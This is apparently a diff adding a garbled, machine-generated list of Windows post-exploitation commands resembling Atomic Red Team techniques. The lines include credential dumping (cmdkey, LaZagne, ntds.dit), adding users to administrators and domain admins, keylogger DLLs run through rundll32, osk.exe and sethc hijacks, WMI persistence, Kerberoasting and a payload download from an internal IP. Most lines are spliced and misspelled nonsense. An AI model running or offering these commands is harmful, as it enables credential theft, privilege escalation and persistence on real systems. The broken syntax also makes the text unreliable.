@@ -1,0 +1,64 @@
+cmdkey /list
+add-localgroupmember - $ `` hklm\software\microsoft\active red hklm\systyem $ { -member : registry_path
+net localgroup administrators `` administrators '' $ { user_name } -l
+vsdiagnostics.exe create administrator /add
+set windir= $ { parent_pid } '
+namp -sn -sn $ { url }
+net group `` domain admins `` .\ % \programdata\microsoft\windows\start \windows\system32 '' -name `` true
+net localgroup administrators
+\system32\osk.exe
+net localgroup administrators `` administrators
+namp -sn -w domain admins `` defaultaccount -l '' $ filter )
+net group `` domain admins `` @ : `` $ % windir volumn -a `` $ '' volumn file @ target $ true /grant administrators } -name administrators keylog
+remove-item -path $ { user_name } ;
+get-wmiobject win32_computersystem `` /l % ntds.dit `` [ ] : :frombase64string ( [ net.securityprotocoltype ] : :securityprotocol = [ net.securityprotocoltype ] net.securityprotocoltype ] : :securityprotocol = new-object | select-object /grant 'https : new-object ) \\ ( $ a = `` http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+sharprdp.exe defaultaccount cor_profiler
+tasklist
+rundll32 keylogger_dll.dll , keylog
+net localgroup administrators `` administrators
+namp -sn $ target t1547.009 . `` domain admins '' -name `` $ : cor_profiler = `` administrators '' -name `` autorun -name = '' '' '' c : cor_profiler -name : threadingmodel -name : -name `` administrators '' -name : cor_profiler = ( -name ``
+winrar a -ibck $ { intput_file_name
+psexec \\ { copy ; full
+get-ciminstance -classname win32_bios
+net localgroup administrators $ shell.createshortcut `` administrators '' -member `` start-process @ $ { filename_regex }
+remove-item -path $ { user_name } ;
+$ shortcut = `` keylog
+for : \windows\system32\desk.cpl , http : installscreensaver $ : options\spoolsv.exe -name : set-wmiinstance -namespace `` http : \users\ /user : exit administrators
+put $ shortcut = `` $ { input_folder_name }
+net localgroup administrators `` /add
+rundll32 popcalc.dll , keylog
+python -c `` powershell `` .\lazagne .. exe all
+net localgroup `` administrators '' `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } \inprocserver32 file -name `` keylog
+shortcut /create $ { shadow copy volumn name you get-process \system32\osk.exe
+sharprdp.exe computername= $ { output_zip_name } @ `` $ { registry_path
+adfind.exe -f % new-object net.servicepointmanager -classname win32_bios
+$ shortcut = `` set-wmiinstance -namespace execution options\svchost.exe '' '' -c threadingmodel /grant threadingmodel '' -name threadingmodel ''
+rundll32 popcalc.dll , keylog
+rubeus.exe kerberoast windir % \system32\osk.exe
+net localgroup administrators `` cor_profiler
+quser
+get-localgroupmember /resume
+quser
+dir -executionpolicy -verbose
+quser
+silentrunner.exe $ : service /v administrators '' `` autorun $ { keylog
+python make_image.py $ { flie_name } -u $ { hklm\software\microsoft\windows nt\currentversion\winlogon\specialaccounts\userlist = `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } in administrators
+lazagne.exe windows
+namp -sn $ volumn } name you keylog
+iediagcmd.exe /out : $ { in target = `` $ { name='atomicredteam-wmipersistence-activescripteventconsumer-example ; ; os.system ; administrators and keylog
+rdrleakdiag.exe /p $ target = `` $ i @ `` $ target = `` $ { filename_regex '' ;
+[ firewall set currentprofile -command add `` hklm\software\microsoft\windows nt\currentversion\image file % installscreensaver $ : \system\currentcontrolset\services\winsock2\parameters -name atomic_red_team /d spooler
+iediagcmd.exe /out $ { shadow copy volumn name = execution \system32\osk.exe /grant administrators administrators
+query user
+net group `` domain admins `` windir % @ % localappdata % \ $ true ;
+namp -sn -l $ target % volumn name = set-wmiinstance file minidump get-process appdata % \updater.exe /grant -command createobject `` hklm\software\microsoft\windows \programdata\microsoft\windows\start -comobject wscript.shell '' ; ;
+net accounts
+icacls % \system32\osk.exe /grant administrators : windir $ { name='atomicredteam-wmipersistence-activescripteventconsumer-example ' ; querylanguage= '' $ ( `` minidump i ; querylanguage= : command= $ target = `` hklm\software\microsoft\windows \users\ administrator /add
+fltmc.exe keylogger_dll_invisible.dll , keylog
+net accounts
+net localgroup administrators
+namp -sn $ target t1547.009 /fullmemdmp account t1547.009 name = minidump _.lastwritetime = pnpclass = `` $ _.lastwritetime : set-wmiinstance \windows\system32\sethc_backup.exe
+wevtutil net.webclient set currentprofile opmode
+cmdkey.exe /list
+get-ciminstance localappdata % \microsoft\teams\current\teams.exe
+$ consumer=set-wmiinstance /grant administrators `` administrators '' '' $ wscriptshell.createshortcut start-process administrators } ''
